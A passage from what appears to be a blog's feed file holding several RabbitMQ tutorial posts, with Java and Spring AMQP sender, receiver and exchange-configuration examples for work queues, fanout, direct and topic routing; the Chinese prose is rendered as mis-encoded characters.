logger.info(&quot;[x] Received:{} &quot;, in);        System.out.println(&quot;[x] Received:{} &quot;+ in);    }}public class Tut1Sender {    private final static Logger logger = LoggerFactory.getLogger(Tut1Sender.class);    @Autowired    private RabbitTemplate rabbitTemplate;    @Autowired    private Queue queue;    @Scheduled(fixedDelay = 1000, initialDelay = 500)    public void send() {        String msg = &quot;hello world&quot;;        this.rabbitTemplate.convertAndSend(queue.getName(), msg);        logger.info(&quot;[x] sent :&quot; + msg);        System.out.println(&quot;[x] sent :&quot; + msg);    }}// java -jar xxx.jar --spring.profiles.active=hello-world,receiver// java -jar xxx.jar --spring.profiles.active=hello-world,sender</code></pre><h4 id="work-queues"><a href="#work-queues" class="headerlink" title="work-queues"></a>work-queues</h4><pre><code>@RabbitListener(queues = &quot;tut.hello&quot;)public class Tut2Receiver {    private final static Logger logger = LoggerFactory.getLogger(Tut2Receiver.class);    private final int instance;    public Tut2Receiver(int i){        this.instance = i;    }    @RabbitHandler    public void receive(String in) throws InterruptedException{        StopWatch watch = new StopWatch();        watch.start();        logger.info(&quot;instance &quot; + this.instance+&quot;[x] recived&quot; + in);        doWork(in);        watch.stop();        logger.info(&quot;instance &quot; + this.instance +&quot;[x] done&quot;);    }    private void doWork(String in) throws InterruptedException{        for (char ch:in.toCharArray()){            if(ch == &apos;.&apos;){                TimeUnit.SECONDS.sleep(1);            }        }    }}public class Tut2Sender {    private static Logger logger = LoggerFactory.getLogger(Tut2Sender.class);    @Autowired    private RabbitTemplate rabbitTemplate;    @Autowired    private Queue queue;    AtomicInteger dots = new AtomicInteger(0);    AtomicInteger count = new AtomicInteger(0);    @Scheduled(fixedDelay = 1000,initialDelay = 500)    public void send(){        StringBuilder builder = new StringBuilder(&quot;hello&quot;);        if(dots.getAndIncrement() == 3){            dots.set(1);        }        for(int i = 0;i&lt;dots.get();i++){            builder.append(&quot;.&quot;);        }        builder.append(count.incrementAndGet());        String msg = builder.toString();        rabbitTemplate.convertAndSend(queue.getName(),msg);        logger.info(&quot;[x] sent {}&quot;,msg);    }}@Profile({&quot;tut2&quot;,&quot;work-queues&quot;})@Configurationpublic class Tut2Config {    @Bean    public Queue hello(){        return new Queue(&quot;tut.hello&quot;);    }    @Profile(&quot;receiver&quot;)    private static class ReceiverConfig{        @Bean        public Tut2Receiver receiver1(){            return new Tut2Receiver(1);        }        @Bean        public Tut2Receiver receiver2(){            return new Tut2Receiver(2);        }    }    @Profile(&quot;sender&quot;)    @Bean    public Tut2Sender sender(){        return new Tut2Sender();    }}</code></pre><h4 id="pub-sub"><a href="#pub-sub" class="headerlink" title="pub-sub"></a>pub-sub</h4><pre><code>@Configuration@Profile({&quot;tut3&quot;,&quot;pub-sub&quot;,&quot;publish-subscribe&quot;})public class Tut3Config {    @Bean    public FanoutExchange fanout(){        return new FanoutExchange(&quot;tut.fanout&quot;);    }    @Profile(&quot;receiver&quot;)    private static class ReceiverConfig{        @Bean        public Queue autoDeleteQueue1(){            return new AnonymousQueue();        }        @Bean        public Queue autoDeleteQueue2(){            return new AnonymousQueue();        }        // Ëøô‰∏™Âú∞ÊñπÂèØËÉΩÊ≥®ÂÜå‰∏çÊàêÂäü        @Bean        public Binding binding1(FanoutExchange fanout,Queue autoDeleteQueue1){            return BindingBuilder.bind(autoDeleteQueue1).to(fanout);        }        @Bean        public Binding binding2(FanoutExchange fanout,Queue autoDeleteQueue2){            return BindingBuilder.bind(autoDeleteQueue2).to(fanout);        }        @Bean        public Tut3Receiver receiver(){            return new Tut3Receiver();        }    }    @Profile(&quot;sender&quot;)    @Bean    public Tut3Sender sender(){        return new Tut3Sender();    }}public class Tut3Receiver {    @RabbitListener(queues = &quot;#{autoDeleteQueue1.name}&quot;)    public void receive1(String in) throws InterruptedException{        receive(in,1);    }    @RabbitListener(queues = &quot;#{autoDeleteQueue2.name}&quot;)    public void receive2(String in) throws InterruptedException{        receive(in,2);    }    public void receive(String in,int receiver) throws InterruptedException{        StopWatch watch = new StopWatch();        watch.start();        System.out.println(&quot;instance &quot; + receiver + &quot;[x] Received&quot; + in);        doWork(in);        watch.stop();        System.out.println(&quot;instance&quot; + receiver + &quot;[x] Done in&quot; + watch.getTotalTimeSeconds()+&quot;s&quot;);    }    private void doWork(String in) throws InterruptedException{        for(char ch: in.toCharArray()){            if(ch == &apos;.&apos;){                TimeUnit.SECONDS.sleep(1);            }        }    }}public class Tut3Sender {    @Autowired    private RabbitTemplate rabbitTemplate;    @Autowired    private FanoutExchange fanout;    AtomicInteger dots = new AtomicInteger(0);    AtomicInteger count = new AtomicInteger(0);    @Scheduled(fixedDelay = 1000,initialDelay = 500)    public void send(){        StringBuilder builder = new StringBuilder(&quot;hello&quot;);        if(dots.getAndIncrement() == 3){            dots.set(1);        }        for(int i = 0;i &lt; dots.get();i++){            builder.append(&quot;.&quot;);        }        builder.append(count.incrementAndGet());        String message = builder.toString();        rabbitTemplate.convertAndSend(fanout.getName(),&quot;&quot;,message);        System.out.println(&quot;[x] sent&quot; +message);    }}</code></pre><h4 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h4><pre><code>@Profile({&quot;tut4&quot;,&quot;routing&quot;})@Configurationpublic class Tut4Config {    // ËÆæÁΩÆexchange    @Bean    public DirectExchange direct(){        return new DirectExchange(&quot;tut.direct&quot;);    }    @Profile(&quot;receiver&quot;)    private static class ReceiverConfig{        // ÂàõÂª∫‰∏§‰∏™ÂåøÂêçQueue  an anonymous, non-durable, exclusive, auto-delete queue        @Bean        public Queue autoDeleteQueue1(){            return new AnonymousQueue();        }        @Bean        public Queue autoDeleteQueue2(){            return new AnonymousQueue();        }        // ÁªëÂÆöÁõ∏ÂÖ≥Êï∞ÊçÆ        @Bean        public Binding binding1a(DirectExchange directExchange,Queue autoDeleteQueue1){            return BindingBuilder.bind(autoDeleteQueue1).to(directExchange).with(&quot;orange&quot;);        }        @Bean        public Binding binding1b(DirectExchange directExchange,Queue autoDeleteQueue1){            return BindingBuilder.bind(autoDeleteQueue1).to(directExchange).with(&quot;black&quot;);        }        @Bean        public Binding binding2a(DirectExchange directExchange,Queue autoDeleteQueue2){            return BindingBuilder.bind(autoDeleteQueue2).to(directExchange).with(&quot;green&quot;);        }        @Bean        public Binding binding2b(DirectExchange direct,Queue autoDeleteQueue2){            return BindingBuilder.bind(autoDeleteQueue2).to(direct).with(&quot;black&quot;);        }        //        @Bean        public Tut4Receiver receiver(){            return new Tut4Receiver();        }    }    @Profile(&quot;sender&quot;)    @Bean    public Tut4Sender sender(){        return new Tut4Sender();    }}public class Tut4Receiver {    @RabbitListener(queues = &quot;#{autoDeleteQueue1.name}&quot;)    public void receive1(String in) throws InterruptedException{        receive(in,1);    }    @RabbitListener(queues = &quot;#{autoDeleteQueue2.name}&quot;)    public void receive2(String in) throws InterruptedException{        receive(in,2);    }    public void receive(String in,int receiver) throws InterruptedException{        StopWatch watch = new StopWatch();        watch.start();        System.out.println(&quot;instance &quot; + receiver+&quot;[x] received &apos; &quot; + in+ &quot;&apos;&quot;);        doWork(in);        watch.stop();        System.out.println(&quot;instance &quot;+ receiver+&quot;[x] Done in&quot; + watch.getTotalTimeSeconds()+&quot;s&quot;);    }    private void doWork(String in) throws InterruptedException{        for(char ch: in.toCharArray()){            if(ch == &apos;.&apos;){                TimeUnit.SECONDS.sleep(1);            }        }    }}public class Tut4Sender {    @Autowired    private RabbitTemplate rabbitTemplate;    @Autowired    private DirectExchange directExchange;    AtomicInteger index = new AtomicInteger(0);    AtomicInteger count = new AtomicInteger(0);    private final String[] keys = {&quot;orange&quot;, &quot;black&quot;, &quot;green&quot;};    @Scheduled(fixedDelay = 1000, initialDelay = 500)    public void send() {        StringBuilder builder = new StringBuilder(&quot;Hello to &quot;);        if (this.index.incrementAndGet() == 3) {            this.index.set(0);        }        String key = keys[this.index.get()];        builder.append(key).append(&apos; &apos;);        builder.append(this.count.incrementAndGet());        String message = builder.toString();        rabbitTemplate.convertAndSend(directExchange.getName(), key, message);        System.out.println(&quot;[X] sent &apos;&quot; + message + &quot;&apos;&quot;);    }}</code></pre><h4 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h4><pre><code>@Profile({&quot;tut5&quot;,&quot;topics&quot;})@Configurationpublic class Tut5Config {    @Bean    public TopicExchange topicExchange(){        return new TopicExchange(&quot;tut.topic&quot;);    }    @Profile(&quot;receiver&quot;)    private static class ReceiverConfig{        @Bean        public Tut5Receiver receiver(){            return new Tut5Receiver();        }        @Bean        public Queue autoDeleteQueue1(){            return new AnonymousQueue();        }        @Bean        public Queue autoDeleteQueue2(){            return new AnonymousQueue();        }        @Bean        public Binding binding1a(TopicExchange topicExchange,Queue autoDeleteQueue1){            return BindingBuilder.bind(autoDeleteQueue1).to(topicExchange).with(&quot;*.orange.*&quot;);        }        @Bean        public Binding binding1b(TopicExchange topicExchange,Queue autoDeleteQueue1){            return BindingBuilder.bind(autoDeleteQueue1).to(topicExchange).with(&quot;*.*.rabbit&quot;);        }        @Bean        public Binding binding2a(TopicExchange topic,Queue autoDeleteQueue2){            return BindingBuilder.bind(autoDeleteQueue2).to(topic).with(&quot;lazy.#&quot;);        }    }    @Profile(&quot;sender&quot;)    @Bean    public Tut5Sender sender(){        return new Tut5Sender();    }}public class Tut5Receiver {    @RabbitListener(queues = &quot;#{autoDeleteQueue1.name}&quot;)    public void receive1(String in) throws InterruptedException {        receive(in, 1);    }    @RabbitListener(queues = &quot;#{autoDeleteQueue2.name}&quot;)    public void receive2(String in) throws InterruptedException {        receive(in, 2);    }    public void receive(String in, int receiver) throws InterruptedException {        StopWatch watch = new StopWatch();        watch.start();        System.out.println(&quot;instance &quot; + receiver + &quot; [X] received &apos; &quot; + in + &quot; &apos;&quot;);        doWork(in);        watch.stop();        System.out.println(&quot;instance &quot; + receiver + &quot; [X] Done in&quot; + watch.getTotalTimeSeconds() +&quot;s&quot;);    }    private void doWork(String in) throws InterruptedException{        for(char ch : in.toCharArray()){            if(ch == &apos;.&apos;){                TimeUnit.SECONDS.sleep(1);            }        }    }}public class Tut5Sender {    @Autowired    private RabbitTemplate rabbitTemplate;    @Autowired    private TopicExchange topicExchange;    AtomicInteger index = new AtomicInteger(0);    AtomicInteger count = new AtomicInteger(0);    private final String[] keys = {&quot;quick.orange.rabbit&quot;, &quot;lazy.orange.elephant&quot;, &quot;quick.orange.fox&quot;,            &quot;lazy.brown.fox&quot;, &quot;lazy.pink.rabbit&quot;, &quot;quick.brown.fox&quot;};    @Scheduled(fixedDelay = 1000,initialDelay = 500)    public void send(){        StringBuilder builder = new StringBuilder(&quot;Hello to &quot;);        if(this.index.incrementAndGet() == keys.length){            this.index.set(0);        }        String key = keys[this.index.get()];        builder.append(key).append(&quot; &quot;);        builder.append(this.count.incrementAndGet());        String message = builder.toString();        rabbitTemplate.convertAndSend(topicExchange.getName(),key,message);    }}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> rabbitmq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ-topic</title>
      <link href="/2020/03/13/RabbitMQ-topic/"/>
      <url>/2020/03/13/RabbitMQ-topic/</url>
      
        <content type="html"><![CDATA[<h3 id="Topic"><a href="#Topic" class="headerlink" title="Topic"></a>Topic</h3><p>Âú®‰πãÂâçÁöÑ‰∏ÄÁØáÊïôÁ®ã‰∏≠ÔºåÊàë‰ª¨ÊîπËøõ‰∫ÜÊó•ÂøóÁ≥ªÁªü„ÄÇÊàë‰ª¨‰ΩøÁî® <code>direct</code> Áõ¥Êé•ÂπøÊí≠ÔºåËÄå‰∏çÊòØ‰ΩøÁî® <code>fanout</code> ,‰ªéËÄåËé∑Âæó‰∫ÜÈÄâÊã©ÊÄßÊé•Êî∂Êó•ÂøóÁöÑÂèØËÉΩÊÄß„ÄÇ</p><p>ËôΩÁÑ∂‰ΩøÁî® <code>direct exchange</code> ÊîπËøõ‰∫ÜÊàë‰ª¨ÁöÑÁ≥ªÁªüÔºå‰ΩÜÂÆÉ‰ªªÁÑ∂ÊúâÂ±ÄÈôêÊÄß‚ÄìÂÆÉ‰∏çËÉΩÂü∫‰∫éÂ§ö‰∏™Ê†áÂáÜËøõË°åË∑ØÁî±„ÄÇ</p><h3 id="Topic-exchange"><a href="#Topic-exchange" class="headerlink" title="Topic exchange"></a>Topic exchange</h3><p>Ê∂àÊÅØÂèëÈÄÅÂà∞ <code>topic exchange</code> ‰∏çËÉΩÊòØ‰∏Ä‰∏™ÈöèÊÑèÁöÑ <code>routing-key</code> „ÄÇÂÆÉÂøÖÈ°ªÊòØ‰∏Ä‰∏™Áî± <code>.</code> ÂàÜÂâ≤ÂçïÁ∫ØÂàóË°®„ÄÇ</p><p>‰æãÂ¶Ç <code>stock.usd.nyse</code> „ÄÅ <code>nyse.vmw</code> „ÄÅ <code>quick.orange.rabbit</code> Á≠â„ÄÇ <code>routing-key</code> ÂèØ‰ª•ÊúâÂ∞ΩÂèØËÉΩÂ§öÔºå‰ΩÜÊòØÊúÄÂ§ö255Â≠óËäÇ„ÄÇ</p><p>ÁªëÂÆöÈîÆÂøÖÈ°ªÈááÁî®Áõ∏ÂêåÁöÑÂΩ¢Âºè„ÄÇ <code>topic exchange</code> Âíå <code>direct exchange</code> Á±ª‰ºº-‰ΩøÁî®ÁâπÂÆö <code>routig key</code><br>ÂèëÈÄÅÁöÑÊ∂àÊÅØ‰ºöË¢´‰º†ÈÄíÂà∞ÂåπÈÖç <code>binding key</code> ÁöÑÈòüÂàóÈáåÈù¢„ÄÇ‰ΩÜÊòØÔºåÂØπ‰∫é <code>routing key</code> Êúâ‰∏§‰∏™ÁâπÊÆäÊÉÖÂÜµ</p><ul><li><code>*</code> (starÔºâÂèØ‰ª•Êõø‰ª£‰∏Ä‰∏™ÂçïËØç </li><li><code>#</code> (hash) ÂèØ‰ª•‰ª£Êõø0‰∏™ÊàñÂ§ö‰∏™ÂçïËØç </li></ul><blockquote><h3 id="Topic-exchange-1"><a href="#Topic-exchange-1" class="headerlink" title="Topic exchange"></a>Topic exchange</h3><p>Topic exchangeÊòØÈùûÂ∏∏ÂéâÂÆ≥ÁöÑÂπ∂‰∏îÂèØ‰ª•Ë°®Áé∞ÂíåÂÖ∂‰ªñexchange‰∏ÄÊ†∑ÁöÑ</p><p>ÂΩì‰∏Ä‰∏™ÈòüÂàóÊòØÁî® <code>#</code> ÁªëÂÆöÔºåÈÇ£‰πàÂ∞±‰ºöÊé•ÂèóÂà∞ÊâÄÊúâ‰ø°ÊÅØÔºå‰∏çÁÆ°routing-keyÊòØ‰ªÄ‰πàÔºåÂ∞±ÂÉèfanout</p><p>ÂΩìÁªëÂÆö‰∏≠‰∏ç‰ΩøÁî® <code>*</code> Âíå <code>#</code> Á≠âÁâπÊÆäÂ≠óÁ¨¶Ôºåtopic exchangeÂ∞±‰ºöÂÉèdirect exchange</p></blockquote><h3 id="Sender-java"><a href="#Sender-java" class="headerlink" title="Sender.java"></a>Sender.java</h3><pre><code>public class Send {    private final static String EXCHANGE_NAME = &quot;test_exchange_topic&quot;;    public static void main(String[] args) throws IOException, TimeoutException {        // ÂàõÂª∫ËøûÊé•        Connection connection = ConnectionUtils.getConnection();        Channel channel = connection.createChannel();        //Â£∞Êòéexchange        channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.TOPIC);        // Ê∂àÊÅØÂÜÖÂÆπ        String msg = &quot;hello world!&quot;;        channel.basicPublish(EXCHANGE_NAME,&quot;routekey1.1&quot;,null,msg.getBytes());        channel.close();        connection.close();    }}</code></pre><h3 id="Rece1-java"><a href="#Rece1-java" class="headerlink" title="Rece1.java"></a>Rece1.java</h3><pre><code>public class Rece1 {    private final static String EXCHANGE_NAME = &quot;test_exchange_topic&quot;;    public static void main(String[] args) throws IOException, TimeoutException {        Connection connection = ConnectionUtils.getConnection();        Channel channel = connection.createChannel();        //        String queueName = channel.queueDeclare().getQueue();//        // Â£∞ÊòéÈòüÂàó//        channel.queueDeclare(queueName,false,false,false,null);        //ÁªëÂÆöÈòüÂàóÂà∞‰∫§Êç¢Êú∫‰∏ä        channel.queueBind(queueName,EXCHANGE_NAME,&quot;routekey.*&quot;);        //Âêå‰∏ÄÊó∂ÂàªÊúçÂä°Âô®Âè™ÂèëÈÄÅ‰∏ÄÊù°Ê∂àÊÅØ        channel.basicQos(1);        Consumer consumer  = new DefaultConsumer(channel){            @Override            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {                String msg = new String(body,&quot;utf-8&quot;);                System.out.println(&quot;rece1 :&quot; + msg);                try {                    TimeUnit.SECONDS.sleep(2);                } catch (InterruptedException e) {                    e.printStackTrace();                }finally {                    System.out.println(&quot;rece1 done&quot;);                    channel.basicAck(envelope.getDeliveryTag(),false);                }            }        };        channel.basicConsume(queueName,false,consumer);    }}</code></pre><h3 id="Rece2-java"><a href="#Rece2-java" class="headerlink" title="Rece2.java"></a>Rece2.java</h3><pre><code>public class Rece2 {    private final static String QUEUE_NAME = &quot;test_queue_topic_work_2&quot;;    private final static String EXCHANGE_NAME = &quot;test_exchange_topic&quot;;    public static void main(String[] args) throws IOException, TimeoutException {        Connection connection = ConnectionUtils.getConnection();        Channel channel = connection.createChannel();        // Â£∞ÊòéÈòüÂàó        channel.queueDeclare(QUEUE_NAME,false,false,false,null);        //ÁªëÂÆöÈòüÂàóÂà∞‰∫§Êç¢Êú∫‰∏ä        channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,&quot;*.*&quot;);        //Âêå‰∏ÄÊó∂ÂàªÊúçÂä°Âô®Âè™ÂèëÈÄÅ‰∏ÄÊù°Ê∂àÊÅØ        channel.basicQos(1);        Consumer consumer  = new DefaultConsumer(channel){            @Override            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {                String msg = new String(body,&quot;utf-8&quot;);                System.out.println(&quot;rece1 :&quot; + msg);                try {                    TimeUnit.SECONDS.sleep(2);                } catch (InterruptedException e) {                    e.printStackTrace();                }finally {                    System.out.println(&quot;rece1 done&quot;);                    channel.basicAck(envelope.getDeliveryTag(),false);                }            }        };        channel.basicConsume(QUEUE_NAME,false,consumer);    }}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> rabbitmq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ-routing</title>
      <link href="/2020/03/11/RabbitMQ-routing/"/>
      <url>/2020/03/11/RabbitMQ-routing/</url>
      
        <content type="html"><![CDATA[<h3 id="routing"><a href="#routing" class="headerlink" title="routing"></a>routing</h3><p>Âú®‰πãÂâçÁöÑÂØºËà™‰∏≠ÔºåÊàë‰ª¨ÂàõÂª∫‰∫Ü‰∏Ä‰∏™ÁÆÄÂçïÊó•ÂøóÁ≥ªÁªüÔºåÊàë‰ª¨ËÉΩÂ§üÂ∞ÜÊó•Âøó‰ø°ÊÅØÂπøÊí≠Âà∞ÂæàÂ§öÊé•ÂèóËÄÖ„ÄÇ</p><p>Âú®Êú¨ÁØáÂØºËà™‰∏≠ÔºåÊàë‰ª¨Â∞Ü‰∏∫ÂÖ∂Ê∑ªÂä†‰∏Ä‰∏™ÁâπÊÄß-Êàë‰ª¨Â∞Ü‰ΩøËÆ¢ÈòÖÊ∂àÊÅØÁöÑ‰∏Ä‰∏™Â≠êÈõÜÊàê‰∏∫ÂèØËÉΩ„ÄÇ‰æãÂ¶ÇÔºåÊàë‰ª¨ËÉΩÂ§üÂ∞ÜÈîôËØØ‰ø°ÊÅØÂÆöÂêëÂÜôÂÖ•ÈîôËØØÊó•ÂøóÊñá‰ª∂ÔºåÂêåÊó∂ËÉΩÂ§üÂú®ÊéßÂà∂Âè∞ÊâìÂç∞ÊâÄÊúâ‰ø°ÊÅØ„ÄÇ</p><h3 id="binding"><a href="#binding" class="headerlink" title="binding"></a>binding</h3><p>Âú®‰πãÂâçÁöÑ‰æãÂ≠ê‰∏≠Êàë‰ª¨ËÉΩÂ§üÂàõÂª∫ÁªëÂÆöÔºå‰Ω†ÂèØËÉΩ‰ºöÂõûÊÉ≥Ëµ∑ËøôÊ†∑ÁöÑ‰ª£Á†Å</p><pre><code>channel.queueBind(queueName, EXCHANGE_NAME, &quot;&quot;);</code></pre><p>ÁªëÂÆöÊòØ‰∫§Êç¢ÂíåÈòüÂàó‰πãÈó¥ÁöÑÂÖ≥Á≥ª„ÄÇËøôÂèØ‰ª•ÁÆÄÂçïÂú∞ÁêÜËß£ÔºöÈòüÂàóÂØπÊù•Ëá™Ëøô‰∏™‰∫§Êç¢ÁöÑÊ∂àÊÅØÊÑüÂÖ¥Ë∂£„ÄÇ</p><p>ÁªëÂÆöÂèØ‰ª•‰ΩøÁî®È¢ùÂ§ñÁöÑroutingKeyÂèÇÊï∞„ÄÇ‰∏∫‰∫ÜÈÅøÂÖç‰∏éÂü∫Êú¨ÁöÑÂèëÂ∏ÉÂèÇÊï∞Ê∑∑Ê∑ÜÔºåÊàë‰ª¨Â∞ÜÂÖ∂Áß∞‰∏∫ÁªëÂÆöÈîÆ„ÄÇËøôÂ∞±ÊòØÊàë‰ª¨Â¶Ç‰ΩïÈîÆÂàõÂª∫ÁªëÂÆöÁöÑÊñπÊ≥ï„ÄÇ</p><pre><code>channel.queueBind(queueName, EXCHANGE_NAME, &quot;black&quot;);</code></pre><p>ÁªëÂÆöÈîÆÁöÑÊÑè‰πâÂèñÂÜ≥‰∫é‰∫§Êç¢Á±ªÂûã„ÄÇÊàë‰ª¨‰πãÂâç‰ΩøÁî®ÁöÑ <code>fanout</code> ‰∫§Êç¢Êú∫ÂÆåÂÖ®ÂøΩÁï•‰∫ÜÂÆÉÁöÑ‰ª∑ÂÄº„ÄÇ</p><h3 id="Direct-exchange"><a href="#Direct-exchange" class="headerlink" title="Direct exchange"></a>Direct exchange</h3><p>Êàë‰ª¨‰πãÂâç‰ΩøÁî®ÁöÑ <code>fanout</code> exchange,ËøôÂπ∂Ê≤°ÊúâÁªôÊàë‰ª¨Â§öÂ§ßÁöÑÁÅµÊ¥ªÊÄß‚Äî‚ÄîÂÆÉÂè™ËÉΩËøõË°å‰∏çÈúÄË¶ÅÂä®ËÑëÁ≠ãÁöÑÂπøÊí≠„ÄÇÊàë‰ª¨Â∞ÜÁî® <code>direct</code><br>exchange.Ê∂àÊÅØÂèØ‰ª•‰º†ÈÄíÂà∞ÂÖ∂ÁªëÂÆöÈîÆ <code>bindingKey</code> ‰∏éÊ∂àÊÅØÁöÑË∑ØÁî±ÈîÆ <code>routingkey</code> ÂÆåÂÖ®ÂåπÈÖçÁöÑÈòüÂàó</p><p>![directÂΩ¢Âºèexchange](<a href="http://qjrzrivoh.hd-" target="_blank" rel="noopener">http://qjrzrivoh.hd-</a><br>bkt.clouddn.com/1605373844.89553489789.png)</p><p>Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÔºåËøôÈáåÈù¢errorÂèØ‰ª•ÂèëÈÄÅÂà∞ <code>amqp.gen-S9b...</code> Âíå <code>amqp.gen-Ag1...</code><br>ÈòüÂàó‰∏≠,ËÄåinfoÂíåwaringÂè™ËÉΩÂèëÈÄÅÂà∞ <code>amqp.gen-Ag1...</code> ÈòüÂàó‰∏≠</p><p>Send.java</p><pre><code>public class Send {    private static final String EXCHANGE_NAME = &quot;test_exchange_direct&quot;;    public static void main(String[] args) throws IOException, TimeoutException {        Connection connection = ConnectionUtils.getConnection();        // ÂàõÂª∫channle        Channel channel = connection.createChannel();        // Â£∞Êòéexchange        channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.DIRECT);        String msg = &quot;hello exchange direct&quot;;        String routingKey = &quot;error&quot;;        channel.basicPublish(EXCHANGE_NAME, routingKey, null, msg.getBytes());        channel.close();        connection.close();    }}</code></pre><p>Rece1.java</p><pre><code>public class Rece1 {    private static final String EXCHANGE_NAME = &quot;test_exchange_direct&quot;;    private static final String QUEUE_NAME = &quot;test_queue_direct1&quot;;    public static void main(String[] args) throws IOException, TimeoutException {        Connection connection = ConnectionUtils.getConnection();        Channel channel = connection.createChannel();        channel.queueDeclare(QUEUE_NAME,false,false,false,null);        channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,&quot;error&quot;);        channel.basicQos(1);        Consumer consumer = new DefaultConsumer(channel){            @Override            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {                String msg = new String(body,&quot;utf-8&quot;);                System.out.println(&quot;rece1 recieve msg :&quot; + msg);                try{                    TimeUnit.SECONDS.sleep(2);                } catch (InterruptedException e) {                    e.printStackTrace();                }finally {                    System.out.println(&quot;rece1 done&quot;);                    channel.basicAck(envelope.getDeliveryTag(),false);                }            }        };        channel.basicConsume(QUEUE_NAME,false,consumer);    }}</code></pre><p>Rece2.java</p><pre><code>public class Rece1 {    private static final String EXCHANGE_NAME = &quot;test_exchange_direct&quot;;    private static final String QUEUE_NAME = &quot;test_queue_direct1&quot;;    public static void main(String[] args) throws IOException, TimeoutException {        Connection connection = ConnectionUtils.getConnection();        Channel channel = connection.createChannel();        channel.queueDeclare(QUEUE_NAME,false,false,false,null);        channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,&quot;error&quot;);        channel.basicQos(1);        Consumer consumer = new DefaultConsumer(channel){            @Override            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {                String msg = new String(body,&quot;utf-8&quot;);                System.out.println(&quot;rece1 recieve msg :&quot; + msg);                try{                    TimeUnit.SECONDS.sleep(2);                } catch (InterruptedException e) {                    e.printStackTrace();                }finally {                    System.out.println(&quot;rece1 done&quot;);                    channel.basicAck(envelope.getDeliveryTag(),false);                }            }        };        channel.basicConsume(QUEUE_NAME,false,consumer);    }}</code></pre><h3 id="ÂÅ∂Â∞îÊä•Èîô"><a href="#ÂÅ∂Â∞îÊä•Èîô" class="headerlink" title="ÂÅ∂Â∞îÊä•Èîô"></a>ÂÅ∂Â∞îÊä•Èîô</h3><p>ÈòüÂàóÁªëÂÆö‰∫§Êç¢Êú∫Êó∂ÔºåroutingKeyÊòØÂÖ∑ÊúâÁºìÂ≠òÊú∫Âà∂ÁöÑ„ÄÇÊàëÂú®ÂÜô‰ª£Á†ÅÁöÑÊó∂ÂÄôÔºåËØØÊìç‰Ωú‰∫ÜÂ∞ÜÈòüÂàóÈÉΩÁªëÂÆö‰∫Ü <code>error</code> Ôºå <code>info</code> , <code>warning</code> .ÊàëÂèëÁé∞Êó†Ê≥ïÂÆûÁé∞‰∏äËø∞ÁöÑÊïàÊûúÔºåÊîπ‰∫Ü‰ª£Á†ÅÔºå‰ΩÜÊòØËøòÊòØÊó†Ê≥ïËß£ÂÜ≥„ÄÇÊúÄÂêéÁôªÂΩï‰∫ÜRabbitMQÊü•ÁúãÁõ∏ÂÖ≥ÁªëÂÆö„ÄÇÂπ∂‰ΩøÁî®ÁöÑunbindÂäüËÉΩ„ÄÇ</p><p><a href="https://imgchr.com/i/8AFtBT" target="_blank" rel="noopener"><br>[Â§ñÈìæÂõæÁâáËΩ¨Â≠òÂ§±Ë¥•,Ê∫êÁ´ôÂèØËÉΩÊúâÈò≤ÁõóÈìæÊú∫Âà∂,Âª∫ËÆÆÂ∞ÜÂõæÁâá‰øùÂ≠ò‰∏ãÊù•Áõ¥Êé•‰∏ä‰º†(img-B8DH8bJF-1583909785873)(https://s2.ax1x.com/2020/03/11/8AFtBT.md.png)]</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> rabbitmq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ-ÂèëÂ∏ÉËÆ¢ÈòÖ</title>
      <link href="/2020/03/09/RabbitMQ-%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85/"/>
      <url>/2020/03/09/RabbitMQ-%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85/</url>
      
